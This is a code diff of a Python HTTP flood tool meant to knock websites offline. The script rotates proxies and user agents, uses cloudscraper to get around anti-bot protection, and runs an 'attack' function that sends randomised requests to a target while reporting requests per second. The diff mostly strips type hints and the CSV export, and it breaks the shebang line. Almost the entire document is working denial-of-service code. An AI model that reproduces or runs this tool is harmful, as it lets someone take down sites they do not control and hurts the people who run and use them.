@@ -1,4 +1,4 @@
-#!/usr/bin/env python3
+!/usr/bin/env python3
 
 import requests
 import time
@@ -14,20 +14,12 @@ from itertools import cycle
 from cloudscraper import create_scraper
 import os
 import subprocess
-import csv
-import socket
-import ssl
-from urllib.parse import urlparse
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from functools import partial
-from typing import Dict, List, Optional, Union
-import sys
-import signal
-import math
-from http.client import HTTPConnection
-from uuid import uuid4
 from collections import deque
+from uuid import uuid4
+import signal
+import sys
 
 # Initialize colorama
 init(autoreset=True)
@@ -54,7 +46,6 @@ USER_AGENTS = [
 
 HTTP_METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"]
 
-
 # Functions
 def display_banner():
     print(f"""{BLUE}
@@ -68,7 +59,7 @@ def display_banner():
     ##################################################
     {RESET}""")
 
-def load_proxies(proxy_file: str) -> List[str]:
+def load_proxies(proxy_file: str):
     try:
         with open(proxy_file, "r") as f:
             proxy_list = f.read().splitlines()
@@ -79,7 +70,7 @@ def load_proxies(proxy_file: str) -> List[str]:
         logging.error(f"Proxy file '{proxy_file}' not found.")
         return []
 
-def validate_proxies(proxies: List[str]) -> List[str]:
+def validate_proxies(proxies):
     validated_proxies = []
     with ThreadPoolExecutor(max_workers=10) as executor:
         future_to_proxy = {executor.submit(check_proxy, proxy): proxy for proxy in proxies}
@@ -93,14 +84,14 @@ def validate_proxies(proxies: List[str]) -> List[str]:
     logging.info(f"Validated {len(validated_proxies)} proxies.")
     return validated_proxies
 
-def check_proxy(proxy: str) -> bool:
+def check_proxy(proxy: str):
     try:
         response = requests.get("https://httpbin.org/ip", proxies={"http": proxy, "https": proxy}, timeout=3)
         return response.status_code == 200
     except requests.RequestException:
         return False
 
-def resolve_target(target_url: str) -> Optional[str]:
+def resolve_target(target_url: str):
     try:
         domain = target_url.split("//")[-1].split("/")[0]
         ip = resolver.resolve(domain, "A")[0].to_text()
@@ -110,7 +101,7 @@ def resolve_target(target_url: str) -> Optional[str]:
         logging.error(f"Failed to resolve domain: {e}")
         return None
 
-def check_target_reachable(ip: str) -> bool:
+def check_target_reachable(ip: str):
     try:
         result = subprocess.run(["ping", "-c", "1", "-W", "2", ip], capture_output=True, text=True)
         return result.returncode == 0
@@ -118,7 +109,7 @@ def check_target_reachable(ip: str) -> bool:
         logging.error(f"Ping check failed: {e}")
         return False
 
-def generate_payload(payload_type: str) -> Union[str, Dict[str, str], None]:
+def generate_payload(payload_type: str):
     payload_id = str(uuid4())
     if payload_type == "json":
         return json.dumps({"id": payload_id, "data": b64encode(os.urandom(64)).decode()})
@@ -129,7 +120,7 @@ def generate_payload(payload_type: str) -> Union[str, Dict[str, str], None]:
     else:
         return None
 
-def attack(target_url: str, stop_event: threading.Event, pause_time: float, proxies: Optional[List[str]] = None, headers: Optional[Dict[str, str]] = None, payload_type: str = "json"):
+def attack(target_url: str, stop_event: threading.Event, pause_time: float, proxies=None, headers=None, payload_type="json"):
     global requests_sent, successful_requests, failed_requests, last_time
     scraper = create_scraper()
     proxy_pool = cycle(proxies) if proxies else None
@@ -161,14 +152,7 @@ def attack(target_url: str, stop_event: threading.Event, pause_time: float, prox
 
         time.sleep(pause_time)
 
-def save_results_to_csv(filename: str, results: List[Dict[str, Union[float, int]]]):
-    with open(filename, "w", newline="") as csvfile:
-        fieldnames = ["Time", "Requests Sent", "Successful Requests", "Failed Requests", "RPS"]
-        writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
-        writer.writeheader()
-        writer.writerows(results)
-
-def display_status(stop_event: threading.Event, duration: int, results_file: Optional[str] = None):
+def display_status(stop_event: threading.Event, duration: int, results_file=None):
     start_time = time.time()
     results = []
     while not stop_event.is_set():
@@ -190,10 +174,7 @@ def display_status(stop_event: threading.Event, duration: int, results_file: Opt
             print(f"{GREEN}Requests Sent: {requests_sent} | Successful: {successful_requests} | Failed: {failed_requests} | RPS: {rps:.2f}{RESET}")
         time.sleep(1)
 
-    if results_file:
-        save_results_to_csv(results_file, results)
-
-def calculate_rps_stats() -> Dict[str, float]:
+def calculate_rps_stats():
     if not rps_history:
         return {"min": 0, "max": 0, "avg": 0}
     return {
